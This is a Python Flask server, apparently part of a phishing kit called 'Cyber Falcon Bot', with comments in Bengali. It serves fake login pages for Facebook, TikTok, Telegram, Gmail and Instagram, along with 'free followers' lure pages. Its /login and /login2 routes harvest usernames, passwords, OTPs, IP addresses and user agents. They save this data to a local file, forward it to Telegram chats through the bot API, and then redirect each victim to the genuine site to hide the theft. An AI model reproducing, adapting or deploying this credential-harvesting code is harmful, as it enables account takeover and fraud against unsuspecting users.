import asyncio
import json
import logging
import os
import socket
import threading
import time
from flask import Flask, request, redirect, render_template, jsonify
import requests
from config import PORT, TELEGRAM_BOT_TOKEN

app = Flask(__name__)

current_page = "facebook"
public_url = None
active_chat_ids = set()

DATA_FILE = "bot_data.json"

def load_data():
    global public_url, active_chat_ids
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                public_url = data.get('public_url')
                active_chat_ids = set(data.get('active_users', []))
                print(f"✅ ডাটা লোড করা হয়েছে: URL={public_url}, Users={len(active_chat_ids)}")
    except Exception as e:
        print(f"ডাটা লোড করতে ব্যর্থ: {e}")

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({
                'public_url': public_url,
                'active_users': list(active_chat_ids)
            }, f)
    except Exception as e:
        print(f"ডাটা সেভ করতে ব্যর্থ: {e}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def send_to_telegram(data):
    platform_info = {
        "facebook": {"name": "Facebook", "icon": "📘"},
        "tiktok": {"name": "TikTok", "icon": "🎵"},
        "telegram": {"name": "Telegram", "icon": "📱"},
        "gmail": {"name": "Gmail", "icon": "📧"},
        "instagram": {"name": "Instagram", "icon": "📸"},
        "facebook_followers": {"name": "Facebook Followers", "icon": "🎯"},
        "whatsapp_groups": {"name": "WhatsApp Groups", "icon": "🤤"},
        "tiktok_boost": {"name": "TikTok Booster", "icon": "🚀"},
        "tiktok_followers": {"name": "TikTok Followers", "icon": "💎"}
    }
    
    page_type = data.get('pageType', 'unknown')
    platform = platform_info.get(page_type, {"name": page_type, "icon": "🌐"})
    
    message = f"""
🦅🥷 {platform['name']} Login Information 🦅🥷

{platform['icon']} Platform: {platform['name']}
👤 Username/Email: {data.get('username', data.get('phone', 'N/A'))}
🔑 Password/OTP: {data.get('password', data.get('otp', 'N/A'))}
🌐 IP Address: {data.get('ipAddress', 'Unknown')}
📱 User Agent: {data.get('userAgent', 'Unknown')}
⏰ Time: {data.get('timestamp', time.strftime("%Y-%m-%d %H:%M:%S"))}
"""
    
    if 'groupName' in data:
        message += f"👥 Group: {data['groupName']}\n"
    if 'video_link' in data and data['video_link']:
        message += f"🎥 Video Link: {data['video_link']}\n"
    if 'service_type' in data:
        message += f"📦 Service: {data['service_type']}\n"
    if 'email' in data and data['email']:
        message += f"📧 Email: {data['email']}\n"
    message += "\n⚡ Cyber Falcon Bot ⚡"
    
    for chat_id in active_chat_ids:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': chat_id, 'text': message}
        
        try:
            response = requests.post(url, data=payload)
            print(f"📢 Message sent to chat_id {chat_id}: {response.status_code}")
        except Exception as e:
            print(f"❌ Error sending to chat_id {chat_id}: {e}")

def add_chat_id(chat_id):
    active_chat_ids.add(chat_id)
    save_data()
    print(f"✅ Added chat_id: {chat_id}")
    print(f"📊 Total users: {len(active_chat_ids)}")

@app.route('/')
def index():
    global current_page
    template_files = {
        "facebook": "facebook.html",
        "tiktok": "tiktok.html", 
        "telegram": "telegram.html",
        "gmail": "gmail.html",
        "instagram": "instagram.html"
    }
    template_file = template_files.get(current_page, "facebook.html")
    template_path = os.path.join('templates', template_file)
    if not os.path.exists(template_path):
        return f"No template found: {template_file}", 500
    return render_template(template_file)

@app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_page
    if page_type in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        current_page = page_type
        return f"Page set to {current_page}"
    return "Invalid page"

@app.route('/get_ngrok_url')
def get_ngrok_url_api():
    global public_url
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url and not public_url:
        public_url = render_url
    return jsonify({
        'public_url': public_url,
        'active_users': len(active_chat_ids),
        'current_page': current_page
    })

@app.route('/set_public_url', methods=['POST'])
def set_public_url():
    global public_url
    data = request.json
    new_url = data.get('url')
    if new_url and new_url.startswith('http'):
        public_url = new_url
        save_data()
        return jsonify({'status': 'success', 'public_url': public_url})
    return jsonify({'status': 'error'}), 400

@app.route('/add_user/<chat_id>')
def add_user(chat_id):
    try:
        add_chat_id(int(chat_id))
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/login', methods=['POST'])
def login():
    data = {
        'username': request.form['username'],
        'password': request.form['password'],
        'ipAddress': request.remote_addr,
        'userAgent': request.headers.get('User-Agent'),
        'pageType': current_page,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    send_to_telegram(data)
    
    redirect_urls = {
        "tiktok": "https://www.tiktok.com/",
        "telegram": "https://web.telegram.org/",
        "gmail": "https://mail.google.com/",
        "instagram": "https://www.instagram.com/",
        "facebook": "https://www.facebook.com/"
    }
    return redirect(redirect_urls.get(current_page, "https://www.google.com/"))

@app.route('/login2', methods=['POST'])
def login2():
    data = {}
    for key in request.form:
        data[key] = request.form[key]
    data['ipAddress'] = request.remote_addr
    data['userAgent'] = request.headers.get('User-Agent')
    data['timestamp'] = time.strftime("%Y-%m-%d %H:%M:%S")
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    send_to_telegram(data)
    
    redirect_urls = {
        "facebook_followers": "https://facebook.com",
        "whatsapp_groups": "https://web.whatsapp.com",
        "tiktok_boost": "https://tiktok.com",
        "tiktok_followers": "https://tiktok.com",
        "default": "https://google.com"
    }
    return redirect(redirect_urls.get(data.get('pageType', 'default'), redirect_urls["default"]))

@app.route('/facebook_followers')
def facebook_followers():
    try:
        return render_template("facebook_followers.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/whatsapp_groups')
def whatsapp_groups():
    try:
        return render_template("whatsapp_groups.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/tiktok_boost')
def tiktok_boost():
    try:
        return render_template("tiktok_boost.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/tiktok_followers')
def tiktok_followers():
    try:
        return render_template("tiktok_followers.html")
    except Exception as e:
        return f"Error: {e}", 500

# ==================================================
# ✅ বট চালানোর সঠিক ও নির্ভরযোগ্য পদ্ধতি
# ==================================================

async def run_bot():
    """Telegram বট চালানোর জন্য আলাদা async ফাংশন"""
    try:
        # telegram_bot মডিউল থেকে রান ফাংশন ইম্পোর্ট করুন
        from telegram_bot import run_bot as start_bot
        
        # এটি telegram_bot.py-এর run_bot ফাংশনকে কল করবে
        print("🦅 Telegram বট চালানোর চেষ্টা করছি...")
        await start_bot()
    except Exception as e:
        print(f"❌ বট চালাতে ব্যর্থ: {e}")
        import traceback
        traceback.print_exc()

def start_bot_thread():
    """একটি নতুন থ্রেডে async বট চালান"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

# ==================================================

if __name__ == '__main__':
    load_data()
    
    # ✅ এভাবেই বট থ্রেড শুরু করুন
    bot_thread = threading.Thread(target=start_bot_thread, daemon=True)
    bot_thread.start()
    print("✅ Telegram বট থ্রেড সফলভাবে শুরু হয়েছে")
    
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url:
        public_url = render_url
        print(f"🥷 Render URL: {public_url}")
    
    local_ip = get_local_ip()
    print(f"\n{'='*50}")
    print(f"🚀 Cyber Falcon Bot - Flask সার্ভার")
    print(f"{'='*50}")
    print(f"📍 লোকাল URL: http://{local_ip}:5000")
    print(f"🌐 পাবলিক URL: {public_url if public_url else 'সেট করা হয়নি'}")
    print(f"📄 বর্তমান পেজ: {current_page}")
    print(f"👥 সক্রিয় ইউজার: {len(active_chat_ids)}")
    print(f"{'='*50}")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
